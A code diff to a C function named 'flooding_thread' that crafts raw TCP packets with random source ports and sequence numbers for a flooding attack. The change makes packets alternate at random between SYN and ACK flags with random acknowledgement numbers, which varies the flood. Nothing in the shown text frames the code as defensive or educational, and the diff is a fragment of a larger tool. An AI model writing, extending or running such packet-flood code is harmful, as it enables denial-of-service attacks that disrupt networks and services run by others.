@@ -126,7 +126,7 @@ void *flooding_thread(void *par1)
     // int randWin = rand()%1000 + 9999;
     tcph->source = randSP; // random source port
     tcph->seq = randSeq;
-    tcph->ack_seq = 0;
+    tcph->ack_seq = 0; // initially 0 but will be set for ACK packets
     tcph->doff = 5;
     tcph->fin = 0;
     tcph->syn = 1;
@@ -137,6 +137,16 @@ void *flooding_thread(void *par1)
     tcph->window = htons(5840); // max window size
     tcph->check = 0; // checksum
     tcph->urg_ptr = 0;
+
+    // alternate between SYN/ACK flags
+    if (rand() % 2) {
+    tcph->syn = 1; // SYN packet
+    tcph->ack = 0;
+    } else {
+    tcph->syn = 0;
+    tcph->ack = 1; // ACK packet
+    tcph->ack_seq = htonl(randAckSeq);
+    }
 
     // set up pseudo-header for checksum
     psh.source_address = inet_addr(source_ip);
